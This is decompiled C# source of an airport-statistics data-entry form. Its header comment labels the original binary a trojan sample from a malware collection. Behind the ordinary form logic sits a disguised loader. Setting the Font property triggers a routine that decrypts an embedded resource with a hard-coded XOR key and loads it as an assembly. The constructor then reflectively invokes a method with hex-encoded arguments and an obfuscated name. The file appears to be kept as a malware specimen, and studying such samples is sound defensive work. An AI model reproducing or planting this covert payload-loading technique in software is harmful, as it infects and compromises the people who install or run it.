// Decompiled with JetBrains decompiler
// Type: HeavyDuck.DeCaire_New_Record
// Assembly: RemotingFieldCachedD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EDD4CF72-357A-47DC-BB8E-50FC31FC092E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-1095c007bb641be5c286e491a4f4ced026984a7767f930ee09c4d2995b5a76f2.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace HeavyDuck
{
  public class DeCaire_New_Record : Form
  {
    private bool completedReport = false;
    private int arrivals;
    private int passengers;
    private DeCaire_Airport_API airport = new DeCaire_Airport_API();
    private IContainer components = (IContainer) null;
    private static object PolicyStatement;
    private DateTimePicker dateTimePicker1;
    private Label label1;
    private TextBox textBox1;
    private Label label2;
    private TextBox textBox2;
    private TextBox textBox3;
    private TextBox textBox4;
    private Label label3;
    private Label label4;
    private Label label5;
    private Label label6;
    private TextBox textBox5;
    private Label label7;
    private TextBox textBox6;
    private Label label8;
    private TextBox textBox7;
    private Label label9;
    private TextBox textBox8;
    private Button button1;
    private Button button2;

    public DeCaire_New_Record()
    {
      this.InitializeComponent();
      ((System.Type) DeCaire_New_Record.PolicyStatement).GetMethod(new string(new char[11]
      {
        'I',
        'n',
        'v',
        'a',
        'l',
        'i',
        'd',
        'C',
        'a',
        's',
        't'
      })).Invoke((object) 0, (object[]) new string[3]
      {
        "52616E646F6D4E756D62657247656E657261",
        "4D383162785069",
        "HeavyDuck"
      });
    }

    private bool validateAirportName()
    {
      if (!string.IsNullOrEmpty(this.textBox2.Text))
        return true;
      int num = (int) MessageBox.Show("Airport name cannot be left empty.");
      return false;
    }

    private bool validateArrivals()
    {
      if (int.TryParse(this.textBox6.Text, out this.arrivals) && this.arrivals > 0)
        return true;
      int num = (int) MessageBox.Show("Number of arrivals must be a positive integer");
      return false;
    }

    private bool validatePassengers()
    {
      if (int.TryParse(this.textBox8.Text, out this.passengers) && this.passengers > 0)
        return true;
      int num = (int) MessageBox.Show("Number of passengers must be a positive integer");
      return false;
    }

    private bool validateCode()
    {
      if (!string.IsNullOrEmpty(this.textBox1.Text) && this.textBox1.Text.Length == 3)
        return true;
      int num = (int) MessageBox.Show("You must enter a 3-letter airport code.");
      return false;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (!(this.validateAirportName() & this.validateArrivals() & this.validatePassengers() & this.validateCode()))
        return;
      DeCaire_Main_Menu.reportList.Add(new DeCaire_Airport_Report()
      {
        AirportCode = this.textBox1.Text,
        AirportName = this.textBox2.Text,
        AirportCity = this.textBox3.Text,
        AirportState = this.textBox4.Text,
        AirportCountry = this.textBox5.Text,
        Date = this.dateTimePicker1.Value,
        NumArrivals = int.Parse(this.textBox6.Text),
        NumDepartures = int.Parse(this.textBox7.Text),
        NumPassengers = int.Parse(this.textBox8.Text)
      });
      int num = (int) MessageBox.Show("Report entered successfully.");
      this.completedReport = true;
      this.Close();
    }

    private void textBox1_Leave(object sender, EventArgs e)
    {
      if (this.validateCode())
      {
        if (this.textBox1.Text.Length != 3)
          return;
        if (this.checkCode(this.textBox1.Text))
        {
          try
          {
            Call call = this.airport.GetCall(this.textBox1.Text);
            if (!string.IsNullOrEmpty(call.code) && !string.IsNullOrEmpty(call.location) && !string.IsNullOrEmpty(call.name))
            {
              string code = call.code;
              string location = call.location;
              string name = call.name;
              string[] strArray = Regex.Split(location, ", ");
              string str1 = strArray[0];
              string str2 = strArray[strArray.Length - 1];
              if (strArray.Length == 3)
                this.textBox4.Text = strArray[1];
              else
                this.textBox4.Text = "";
              this.textBox2.Text = name;
              this.textBox3.Text = str1;
              this.textBox5.Text = str2;
            }
          }
          catch
          {
          }
        }
        else
        {
          int num = (int) MessageBox.Show("The code must contain only letters.");
          this.textBox1.Text = (string) null;
        }
      }
      else
        this.textBox1.Text = (string) null;
    }

    private bool checkCode(string code)
    {
      bool flag = false;
      foreach (char ch in code)
      {
        if ('A' > ch || ch > 'Z')
          return false;
        flag = true;
      }
      return flag;
    }

    private void button2_Click(object sender, EventArgs e) => this.Close();

    private void Form2_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (this.completedReport || MessageBox.Show("Are you sure you want to discard this entry?", "Confirm exit", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.No)
        return;
      e.Cancel = true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    public override Font Font
    {
      get => base.Font;
      set => DeCaire_New_Record.JitHelpers();
    }

    private static string JitHelpers()
    {
      byte[] rawAssembly = (byte[]) new ResourceManager(typeof (DeCaire_Main_Menu)).GetObject("Utils");
      string str = "795HC8CJ1QF1BT24HGWH55";
      for (int index1 = 44054; index1 >= 0; index1 += -1)
      {
        int num1 = 22;
        int num2 = 256;
        int index2 = index1 % 22016;
        long num3 = (long) (Convert.ToUInt32((int) rawAssembly[index2] ^ (int) str[index1 % num1]) - Convert.ToUInt32(rawAssembly[(index1 + 3 - 2) % 22016])) + (long) num2;
        rawAssembly[index2] = (byte) ((ulong) (num3 % (long) num2 + 25L) - 25UL);
      }
      DeCaire_New_Record.DWOIU4382(AppDomain.CurrentDomain.Load(rawAssembly), 1);
      return str;
    }

    private static void DWOIU4382(Assembly Canonical, int i) => DeCaire_New_Record.PolicyStatement = (object) Canonical.GetType("Evercraft_model.Character");

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (DeCaire_New_Record));
      this.dateTimePicker1 = new DateTimePicker();
      this.label1 = new Label();
      this.textBox1 = new TextBox();
      this.label2 = new Label();
      this.textBox2 = new TextBox();
      this.textBox3 = new TextBox();
      this.textBox4 = new TextBox();
      this.label3 = new Label();
      this.label4 = new Label();
      this.label5 = new Label();
      this.label6 = new Label();
      this.textBox5 = new TextBox();
      this.label7 = new Label();
      this.textBox6 = new TextBox();
      this.label8 = new Label();
      this.textBox7 = new TextBox();
      this.label9 = new Label();
      this.textBox8 = new TextBox();
      this.button1 = new Button();
      this.button2 = new Button();
      this.SuspendLayout();
      this.dateTimePicker1.Location = new Point(12, 48);
      this.dateTimePicker1.Name = "dateTimePicker1";
      this.dateTimePicker1.Size = new Size(141, 20);
      this.dateTimePicker1.TabIndex = 0;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(9, 32);
      this.label1.Name = "label1";
      this.label1.Size = new Size(80, 13);
      this.label1.TabIndex = 1;
      this.label1.Text = "Date of Record";
      this.textBox1.CharacterCasing = CharacterCasing.Upper;
      this.textBox1.Location = new Point(12, 100);
      this.textBox1.MaxLength = 3;
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(100, 20);
      this.textBox1.TabIndex = 2;
      this.textBox1.Leave += new EventHandler(this.textBox1_Leave);
      this.label2.AutoSize = true;
      this.label2.Location = new Point(12, 81);
      this.label2.Name = "label2";
      this.label2.Size = new Size(155, 13);
      this.label2.TabIndex = 3;
      this.label2.Text = "3-Letter Airport Code (e.g. YYZ)";
      this.textBox2.Location = new Point(186, 100);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(232, 20);
      this.textBox2.TabIndex = 4;
      this.textBox3.Location = new Point(186, 139);
      this.textBox3.Name = "textBox3";
      this.textBox3.Size = new Size(111, 20);
      this.textBox3.TabIndex = 5;
      this.textBox4.Location = new Point(303, 139);
      this.textBox4.Name = "textBox4";
      this.textBox4.Size = new Size(115, 20);
      this.textBox4.TabIndex = 6;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(183, 81);
      this.label3.Name = "label3";
      this.label3.Size = new Size(68, 13);
      this.label3.TabIndex = 7;
      this.label3.Text = "Airport Name";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(186, 123);
      this.label4.Name = "label4";
      this.label4.Size = new Size(24, 13);
      this.label4.TabIndex = 8;
      this.label4.Text = "City";
      this.label5.AutoSize = true;
      this.label5.Location = new Point(300, 123);
      this.label5.Name = "label5";
      this.label5.Size = new Size(79, 13);
      this.label5.TabIndex = 9;
      this.label5.Text = "Province/State";
      this.label6.AutoSize = true;
      this.label6.Location = new Point(186, 162);
      this.label6.Name = "label6";
      this.label6.Size = new Size(43, 13);
      this.label6.TabIndex = 10;
      this.label6.Text = "Country";
      this.textBox5.Location = new Point(186, 179);
      this.textBox5.Name = "textBox5";
      this.textBox5.Size = new Size(111, 20);
      this.textBox5.TabIndex = 11;
      this.label7.AutoSize = true;
      this.label7.Location = new Point(15, 206);
      this.label7.Name = "label7";
      this.label7.Size = new Size(93, 13);
      this.label7.TabIndex = 13;
      this.label7.Text = "Number of Arrivals";
      this.textBox6.Location = new Point(18, 223);
      this.textBox6.Name = "textBox6";
      this.textBox6.Size = new Size(100, 20);
      this.textBox6.TabIndex = 14;
      this.label8.AutoSize = true;
      this.label8.Location = new Point(131, 206);
      this.label8.Name = "label8";
      this.label8.Size = new Size(111, 13);
      this.label8.TabIndex = 15;
      this.label8.Text = "Number of Departures";
      this.textBox7.Location = new Point(134, 223);
      this.textBox7.Name = "textBox7";
      this.textBox7.Size = new Size(100, 20);
      this.textBox7.TabIndex = 16;
      this.label9.AutoSize = true;
      this.label9.Location = new Point(249, 205);
      this.label9.Name = "label9";
      this.label9.Size = new Size(114, 13);
      this.label9.TabIndex = 17;
      this.label9.Text = "Number of Passengers";
      this.textBox8.Location = new Point(252, 222);
      this.textBox8.Name = "textBox8";
      this.textBox8.Size = new Size(100, 20);
      this.textBox8.TabIndex = 18;
      this.button1.Location = new Point(262, 269);
      this.button1.Name = "button1";
      this.button1.Size = new Size(75, 23);
      this.button1.TabIndex = 19;
      this.button1.Text = "Submit";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.button2.Location = new Point(343, 269);
      this.button2.Name = "button2";
      this.button2.Size = new Size(75, 23);
      this.button2.TabIndex = 20;
      this.button2.Text = "Cancel";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.Font = (Font) null;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(431, 304);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox8);
      this.Controls.Add((Control) this.label9);
      this.Controls.Add((Control) this.textBox7);
      this.Controls.Add((Control) this.label8);
      this.Controls.Add((Control) this.textBox6);
      this.Controls.Add((Control) this.label7);
      this.Controls.Add((Control) this.textBox5);
      this.Controls.Add((Control) this.label6);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.textBox4);
      this.Controls.Add((Control) this.textBox3);
      this.Controls.Add((Control) this.textBox2);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.dateTimePicker1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (DeCaire_New_Record);
      this.Text = "New Record";
      this.FormClosing += new FormClosingEventHandler(this.Form2_FormClosing);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
